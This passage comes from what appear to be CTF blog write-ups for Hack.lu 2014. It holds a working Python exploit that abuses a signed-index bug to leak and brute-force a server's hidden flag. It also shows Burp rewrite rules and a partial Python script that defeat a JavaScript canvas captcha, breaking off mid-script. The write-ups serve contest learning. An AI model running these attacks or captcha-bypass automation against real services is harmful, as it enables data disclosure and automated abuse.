</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="c"># This loop causes server to copy the hidden flag; instead of expanding hex</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
</span><span class='line'>        <span class="n">l</span> <span class="o">+=</span> <span class="p">[</span><span class="s">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">i</span><span class="p">)]</span> <span class="c"># Put a zero in the high order nibble</span>
</span><span class='line'>                                <span class="c"># Place negative offset of this flag char in low-order</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">l</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Format the flag and encode it for the wire</span>
</span><span class='line'><span class="k">def</span> <span class="nf">encode_flag</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;flag{&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> \
</span><span class='line'>           <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">+</span> \
</span><span class='line'>           <span class="s">&#39;}&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encode_flag</span><span class="p">(</span><span class="n">generate_flag</span><span class="p">()))</span>
</span></code></pre></td></tr></table></div></figure>

<p>The output ends up looking like: <code>666c61677b0\x850\x860\x870\x88...</code> where
<code>666c61677b</code> is the encoded &quot;flag{&quot;, the zero nibbles corresponds to <code>value1</code>,
and the 0x85,0x86,&#8230; are negative integers corresponding to <code>value2</code>. This
leads to populating <code>given_flag</code> as:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">50</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="n">given_flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Sure enough, this payload works locally, but it fails remotely. Is the system
employing ASLR? Is the layout static, but different somehow? We could write
code to guess the offset, but let&#8217;s just see what happens if we assume the
system is 32-bit. Compile with <code>-m32</code> and we see the offset is now 64 bytes
instead of 128. Therefore, we change start from -123 to -59. This change works
against the server and we now see: &quot;Yaaaay! You guessed the flag correctly! But
do you still remember what you entered? If not, feel free to try again!&quot;</p>

<p>We don&#8217;t have the flag, but we do have a way to test each byte in isolation. We
start with the payload we generated, and try all hexadecimal values [0-9a-f]
for the first character until the correct one is found. Then, repeat with the
second character, until the last (44th) character is verified. Therefore, the
problem space is greatly reduced from 16^44 to 16*44; 50 orders of magnitude.</p>

<p>The complete solution is listed below:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span>
</span><span class='line'>
</span><span class='line'><span class="c"># stack location of flags var, relative to bit<em>to</em>hex</span>
</span><span class='line'><span class="n">start</span> <span class="o">=</span> <span class="o">-</span><span class="mi">59</span>            <span class="c"># For 64-bit machines replace with: -123</span>
</span><span class='line'><span class="n">host</span>  <span class="o">=</span> <span class="s">&#39;wildwildweb.fluxfingers.net&#39;</span>
</span><span class='line'><span class="n">port</span>  <span class="o">=</span> <span class="mi">1412</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Python doesn&#39;t support chr(-x), so do unsigned -&gt; signed conversion.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">twos<em>comp</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">256</span> <span class="o">+</span> <span class="n">n</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Generate a flag which exploits the char-index defect. This flag should always</span>
</span><span class='line'><span class="c"># work, even though it is an invalid format.</span>
</span><span class='line'><span class="c"># In this code, a flag is a list of 44 hexadecimal bytes (strings of length 2)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">generate</em>flag</span><span class="p">():</span>
</span><span class='line'>    <span class="n">s</span> <span class="o">=</span> <span class="n">twos<em>comp</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="c"># This loop causes server to copy the hidden flag; instead of expanding hex</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
</span><span class='line'>        <span class="n">l</span> <span class="o">+=</span> <span class="p">[</span><span class="s">&#39;0&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="n">i</span><span class="p">)]</span> <span class="c"># Put a zero in the high order nibble</span>
</span><span class='line'>                                <span class="c"># Place negative offset of this flag char in low-order</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">l</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Format the flag and encode it for the wire</span>
</span><span class='line'><span class="k">def</span> <span class="nf">encode</em>flag</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;flag{&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> \
</span><span class='line'>           <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">+</span> \
</span><span class='line'>           <span class="s">&#39;}&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Were we successful?</span>
</span><span class='line'><span class="k">def</span> <span class="nf">check<em>resp</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">&#39;Yaaaay&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Were we successful (for the prior request)?</span>
</span><span class='line'><span class="k">def</span> <span class="nf">check</em>sock</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="n">rv</span> <span class="o">=</span> <span class="n">check<em>resp</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">rv</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Send a flag to the server</span>
</span><span class='line'><span class="k">def</span> <span class="nf">send</em>flag</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">f</span><span class="p">):</span>
</span><span class='line'>    <span class="c"># Eat the prompt</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Bonvoyage!</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encode<em>flag</span><span class="p">(</span><span class="n">f</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Connect</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF</em>INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK<em>STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Eat the MOTD</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># This flag should work, as long as the offset is correct</span>
</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="n">generate</em>flag</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;VERIFYING FLAG OFFSET...&quot;</span>
</span><span class='line'><span class="n">send<em>flag</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">base</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">check</em>sock</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;  Success!&quot;</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;  Failed!&quot;</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Accumulate the flag as it is discovered</span>
</span><span class='line'><span class="n">discovered</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">base</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">mutant</span> <span class="o">=</span> <span class="n">base</span><span class="p">[:]</span>
</span><span class='line'>    <span class="n">disc<em>byte</span> <span class="o">=</span> <span class="s">&#39;??&#39;</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="s">&#39;0123456789abcdef&#39;</span><span class="p">:</span>
</span><span class='line'>        <span class="n">byte</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">mutant</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">send</em>flag</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">mutant</span><span class="p">)</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">check<em>sock</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>            <span class="n">disc</em>byte</span> <span class="o">=</span> <span class="n">byte</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;</span><span class="si">%d</span><span class="s"> -&gt; 0x</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>    <span class="n">discovered</span> <span class="o">+=</span> <span class="n">disc<em>byte</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;VERIFYING FINAL FLAG...&quot;</span>
</span><span class='line'><span class="n">send</em>flag</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">discovered</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">check<em>sock</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;  Success! The flag is: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">encode</em>flag</span><span class="p">(</span><span class="n">discovered</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;  Failed!&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The result is
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">666</span><span class="n">c61677b3639373437333661373537</span>
</span><span class='line'><span class="mi">33373436633639366236353639366537</span>
</span><span class='line'><span class="mi">34363836353664366637363639363537</span>
</span><span class='line'><span class="mi">337</span><span class="n">d</span>
</span></code></pre></td></tr></table></div></figure>
Decode, and we get &quot;flag{6974736a7573746c696b65696e7468656d6f76696573}&quot;.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Dalton's Corporate Security Safe for Business]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/"/>
    <updated>2014-10-24T23:54:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>The Dalton Brothers are tricking people into buying their &quot;safe&quot; locks. So they
can rob them afterwards. The lock has some safety features, as it resets itself
after a few seconds. It also requires a lot of valid inputs before it&#8217;s letting
you open it. Please find out what their weakness is and report back. </p>

<p><a href="https://wildwildweb.fluxfingers.net:1422/">link</a></p>

<h2>Analysis</h2>

<p>The captcha image is being painted in a canvas clientside by JavaScript. This
is done in 8 ways. 3 examples are:</p>

<p>1) Base64 Decoding a value
2) Using Javascript.fromCharCode()
3) /n/.source</p>

<p>These values are then inserted using
<a href="http://www.w3schools.com/tags/canvas_filltext.asp">fillText()</a>. The fillText
function looks like this (var,x,y), where x is left right relative to the HTML
canvas and y is up down relative to the canvas.  So to put the numbers in
order, you can grep out the fillText functions and sort by the x position to
get them in the right order.</p>

<h2>Solution</h2>

<p>Since there is a lot of variance in how the variables are assigned and used to
build the captcha (including some variable reuse), it seemed to make the most
sense to store these values immediately after they are used, then populate and
submit the form automatically. Because of this, I decided to modify the
JavaScript inline using Burp. I used the following search/replace rules on the
response body:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>match: &lt;script&gt;
</span><span class='line'>replace: &lt;script&gt;blakeval={};</span></code></pre></td></tr></table></div></figure>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>match: fillText\((.*?)\)
</span><span class='line'>replace: fillText($1);var args="$1".split(','); var b1=args[0]; var b2=args[1]; blakeval[b2]=eval(b1);</span></code></pre></td></tr></table></div></figure>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>match: &lt;/script&gt;
</span><span class='line'>replace: var fieldval = ""; for(var key in blakeval) { fieldval += blakeval[key] }; document.getElementsByName('solution')[0].value = fieldval; document.forms[0].submit()&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>

<p>By using the x index from fillItem() as the key in property, it will be autosorted in the way that we need. Then simply populate the form and submit. Wait a while and then the link is unlocked.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://wildwildweb.fluxfingers.net:1422/?login=rRrtTE0WYFh5bVHToYQwKyvP</span></code></pre></td></tr></table></div></figure>

<p>Flag:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fef9565c97c3a62fe10d2a0084a9e8179d72f4a05084997cb80e900d1a77a42e3</span></code></pre></td></tr></table></div></figure></p>

<h2>Alternative Solution</h2>

<p>This solution (written in Python) utilizes the following workflow:
 * Request the HTTP session, find the &lt;script&gt; and separate the
   Javascript into individual lines
 * Parse the Javascript (minding the X-coordinate of the textfill() function to
   reassemble the order.  There are a total of eight tricks they&#8217;re using to
   obfuscate the characters, so there&#8217;s are eight branches depending on which
   one we&#8217;ve encountered.
 * Extract the characters and PHP session ID, then resubmit the page.
 * Loop repeatedly until the locks allow access to the flag
 * Access the flag when the URL is unlocked.</p>

<p>It&#8217;s a terrible, terrible script, but here it is for grins.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span> <span class="c"># RegEx to extract &lt;script&gt; .* &lt;/script&gt;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>   <span class="c"># Used for GET/POST requests</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>  <span class="c"># Needed to deobfuscate some of the characters</span>
</span><span class='line'>
</span><span class='line'><span class="c"># This generates Javascript output and is used to verify the decoding of each character and position</span>
</span><span class='line'><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'><span class="c"># The hard work is broken into four functions</span>
</span><span class='line'><span class="c">#   isALetter - detect the presence of any of the eight obfuscation methods</span>
</span><span class='line'><span class="c">#   extractLetter - deobfuscate the Javascript (using one of eight techniques)</span>
</span><span class='line'><span class="c">#   isAPosition - detects the presence of fillText() which is used to draw a character and includes the X,Y coordinates</span>
</span><span class='line'><span class="c">#   extractPosition - extracts the X coordinates of the character being printed</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">extractLetter</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span><span class='line'>  <span class="k">if</span> <span class="s">&#39;atob&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;1&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;(&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span>  <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;fromCharCode&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;2&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;(&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;)&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="p">))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span>  <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;.source&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;3&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="n">line</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">line</span>
</span><span class='line'>  <span class="k">elif</span> <span class="s">&#39;!1&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>    <span class="c">#false</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="s">&quot;false&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> <span class="k">print</span> <span class="s">&quot;4&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
